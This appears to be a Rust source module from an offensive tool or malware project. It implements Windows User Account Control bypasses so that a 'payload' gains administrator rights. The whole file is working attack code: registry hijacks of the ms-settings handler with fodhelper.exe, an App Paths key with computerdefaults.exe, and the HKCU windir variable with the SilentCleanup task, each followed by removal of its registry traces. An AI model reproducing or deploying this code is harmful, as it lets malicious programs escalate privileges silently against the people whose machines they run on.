// UAC Bypass
// Bypasses User Account Control for privilege escalation
// 
// UAC bypass is optional and only needed for privilege escalation when the payload requires admin rights.

use winapi::um::winnt::*;
use winapi::um::processthreadsapi::*;
use winapi::um::winuser::*;
use winapi::um::winreg::*;
use winapi::um::winbase::*;
use winapi::shared::minwindef::*;
use winapi::shared::winerror::*;
use std::ptr;
use std::ffi::CString;

/// Check if current process is running as administrator
pub unsafe fn is_running_as_admin() -> bool {
    let mut token: HANDLE = ptr::null_mut();
    
    // Open current process token
    if OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_QUERY,
        &mut token,
    ) == 0 {
        return false;
    }
    
    // Get SID for Administrators group
    let mut administrators_sid: *mut winapi::um::winnt::SID = ptr::null_mut();
    let mut sid_size = 0u32;
    
    // First call to get size
    CreateWellKnownSid(
        WinBuiltinAdministratorsSid,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut sid_size,
    );
    
    // Allocate buffer
    let mut sid_buffer = vec![0u8; sid_size as usize];
    administrators_sid = sid_buffer.as_mut_ptr() as *mut winapi::um::winnt::SID;
    
    if CreateWellKnownSid(
        WinBuiltinAdministratorsSid,
        ptr::null_mut(),
        administrators_sid,
        &mut sid_size,
    ) == 0 {
        CloseHandle(token);
        return false;
    }
    
    // Check if token is member of Administrators group
    let mut is_member = 0i32;
    if CheckTokenMembership(
        token,
        administrators_sid,
        &mut is_member,
    ) == 0 {
        CloseHandle(token);
        return false;
    }
    
    CloseHandle(token);
    is_member != 0
}

/// Bypass UAC using FodHelper.exe method
/// 
/// Creates registry key to hijack ms-settings protocol handler
pub unsafe fn bypass_uac_fodhelper(exe_path: &str) -> Result<(), String> {
    let mut hkey: HKEY = ptr::null_mut();
    
    // Create registry key: HKCU\Software\Classes\ms-settings\shell\open\command
    let key_path = CString::new("Software\\Classes\\ms-settings\\shell\\open\\command").unwrap();
    
    // Create or open key
    let status = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        key_path.as_ptr() as *const i8,
        0,
        ptr::null_mut(),
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        ptr::null_mut(),
        &mut hkey,
        ptr::null_mut(),
    );
    
    if status != ERROR_SUCCESS {
        return Err(format!("Failed to create registry key: {}", status));
    }
    
    // Set (default) value to payload path
    let exe_path_cstr = CString::new(exe_path)
        .map_err(|e| format!("Failed to create CString: {}", e))?;
    let value_data = exe_path_cstr.as_bytes_with_nul();
    
    let status = RegSetValueExA(
        hkey,
        ptr::null(), // (default) value
        0,
        REG_SZ,
        value_data.as_ptr() as *const u8,
        value_data.len() as u32,
    );
    
    if status != ERROR_SUCCESS {
        RegCloseKey(hkey);
        return Err(format!("Failed to set registry value: {}", status));
    }
    
    // Set DelegateExecute to empty string
    let delegate_execute = CString::new("").unwrap();
    let delegate_data = delegate_execute.as_bytes_with_nul();
    let delegate_name = CString::new("DelegateExecute").unwrap();
    
    let status = RegSetValueExA(
        hkey,
        delegate_name.as_ptr() as *const i8,
        0,
        REG_SZ,
        delegate_data.as_ptr() as *const u8,
        delegate_data.len() as u32,
    );
    
    RegCloseKey(hkey);
    
    if status != ERROR_SUCCESS {
        return Err(format!("Failed to set DelegateExecute: {}", status));
    }
    
    // Launch fodhelper.exe (will trigger payload with elevated privileges)
    let fodhelper_path = CString::new("C:\\Windows\\System32\\fodhelper.exe").unwrap();
    let mut startup_info = STARTUPINFOA {
        cb: std::mem::size_of::<STARTUPINFOA>() as u32,
        ..Default::default()
    };
    let mut process_info = PROCESS_INFORMATION::default();
    
    let success = CreateProcessA(
        fodhelper_path.as_ptr() as *const i8,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        0,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut startup_info,
        &mut process_info,
    );
    
    if success == 0 {
        // Clean up registry key on failure
        let _ = RegDeleteKeyA(HKEY_CURRENT_USER, key_path.as_ptr() as *const i8);
        return Err(format!("Failed to launch fodhelper.exe: {}", GetLastError()));
    }
    
    // Wait a bit for process to start
    Sleep(2000);
    
    // Clean up registry key
    let _ = RegDeleteKeyA(HKEY_CURRENT_USER, key_path.as_ptr() as *const i8);
    
    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);
    
    Ok(())
}

/// Bypass UAC using ComputerDefaults method
/// 
/// Hijacks computerdefaults.exe via App Paths registry key
pub unsafe fn bypass_uac_computerdefaults(exe_path: &str) -> Result<(), String> {
    let mut hkey: HKEY = ptr::null_mut();
    
    // Create registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\computer.exe
    let key_path = CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\computer.exe").unwrap();
    
    // Create or open key
    let status = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        key_path.as_ptr() as *const i8,
        0,
        ptr::null_mut(),
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        ptr::null_mut(),
        &mut hkey,
        ptr::null_mut(),
    );
    
    if status != ERROR_SUCCESS {
        return Err(format!("Failed to create registry key: {}", status));
    }
    
    // Set (default) value to payload path
    let exe_path_cstr = CString::new(exe_path)
        .map_err(|e| format!("Failed to create CString: {}", e))?;
    let value_data = exe_path_cstr.as_bytes_with_nul();
    
    let status = RegSetValueExA(
        hkey,
        ptr::null(), // (default) value
        0,
        REG_SZ,
        value_data.as_ptr() as *const u8,
        value_data.len() as u32,
    );
    
    RegCloseKey(hkey);
    
    if status != ERROR_SUCCESS {
        return Err(format!("Failed to set registry value: {}", status));
    }
    
    // Launch computerdefaults.exe (will trigger payload with elevated privileges)
    let computerdefaults_path = CString::new("C:\\Windows\\System32\\computerdefaults.exe").unwrap();
    let mut startup_info = STARTUPINFOA {
        cb: std::mem::size_of::<STARTUPINFOA>() as u32,
        ..Default::default()
    };
    let mut process_info = PROCESS_INFORMATION::default();
    
    let success = CreateProcessA(
        computerdefaults_path.as_ptr() as *const i8,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        0,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut startup_info,
        &mut process_info,
    );
    
    if success == 0 {
        // Clean up registry key on failure
        let _ = RegDeleteKeyA(HKEY_CURRENT_USER, key_path.as_ptr() as *const i8);
        return Err(format!("Failed to launch computerdefaults.exe: {}", GetLastError()));
    }
    
    // Wait a bit for process to start
    Sleep(2000);
    
    // Clean up registry key
    let _ = RegDeleteKeyA(HKEY_CURRENT_USER, key_path.as_ptr() as *const i8);
    
    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);
    
    Ok(())
}

/// Bypass UAC using SilentCleanup method
/// 
/// Hijacks SilentCleanup scheduled task via Environment variable
pub unsafe fn bypass_uac_silentcleanup(exe_path: &str) -> Result<(), String> {
    let mut hkey: HKEY = ptr::null_mut();
    
    // Create registry key: HKCU\Environment
    let key_path = CString::new("Environment").unwrap();
    
    // Open key
    let status = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        key_path.as_ptr() as *const i8,
        0,
        KEY_WRITE,
        &mut hkey,
    );
    
    if status != ERROR_SUCCESS {
        return Err(format!("Failed to open registry key: {}", status));
    }
    
    // Set windir value to: cmd.exe /c payload.exe
    let cmd_value = format!("cmd.exe /c \"{}\"", exe_path);
    let cmd_cstr = CString::new(cmd_value)
        .map_err(|e| format!("Failed to create CString: {}", e))?;
    let value_data = cmd_cstr.as_bytes_with_nul();
    let value_name = CString::new("windir").unwrap();
    
    let status = RegSetValueExA(
        hkey,
        value_name.as_ptr() as *const i8,
        0,
        REG_SZ,
        value_data.as_ptr() as *const u8,
        value_data.len() as u32,
    );
    
    RegCloseKey(hkey);
    
    if status != ERROR_SUCCESS {
        return Err(format!("Failed to set registry value: {}", status));
    }
    
    // Trigger SilentCleanup scheduled task
    // CreateProcessA can modify lpCommandLine, so we need a mutable buffer
    let schtasks_cmd_str = "schtasks.exe /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
    let mut cmd_buffer = Vec::<i8>::with_capacity(schtasks_cmd_str.len() + 1);
    cmd_buffer.extend(schtasks_cmd_str.bytes().map(|b| b as i8));
    cmd_buffer.push(0); // null terminator
    
    let mut startup_info = STARTUPINFOA {
        cb: std::mem::size_of::<STARTUPINFOA>() as u32,
        ..Default::default()
    };
    let mut process_info = PROCESS_INFORMATION::default();
    
    let success = CreateProcessA(
        CString::new("C:\\Windows\\System32\\schtasks.exe").unwrap().as_ptr() as *const i8,
        cmd_buffer.as_mut_ptr(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        0,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut startup_info,
        &mut process_info,
    );
    
    if success == 0 {
        // Clean up registry key on failure
        let _ = RegDeleteValueA(
            HKEY_CURRENT_USER,
            key_path.as_ptr() as *const i8,
            value_name.as_ptr() as *const i8,
        );
        return Err(format!("Failed to trigger SilentCleanup: {}", GetLastError()));
    }
    
    // Wait a bit for process to start
    Sleep(2000);
    
    // Clean up registry key
    let _ = RegDeleteValueA(
        HKEY_CURRENT_USER,
        key_path.as_ptr() as *const i8,
        value_name.as_ptr() as *const i8,
    );
    
    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);
    
    Ok(())
}

/// Main UAC bypass function
/// Checks if admin rights are needed and attempts bypass if required
/// 
/// Requires the current executable path to be passed for registry hijacking
pub unsafe fn bypass_uac(exe_path: &str) -> Result<(), String> {
    // Check if already running as admin
    if is_running_as_admin() {
        return Ok(()); // No bypass needed
    }
    
    // Try FodHelper method first (most reliable)
    if let Ok(_) = bypass_uac_fodhelper(exe_path) {
        return Ok(());
    }
    
    // Try ComputerDefaults method
    if let Ok(_) = bypass_uac_computerdefaults(exe_path) {
        return Ok(());
    }
    
    // Try SilentCleanup method (less reliable, but good fallback)
    if let Ok(_) = bypass_uac_silentcleanup(exe_path) {
        return Ok(());
    }
    
    Err("All UAC bypass methods failed".to_string())
}
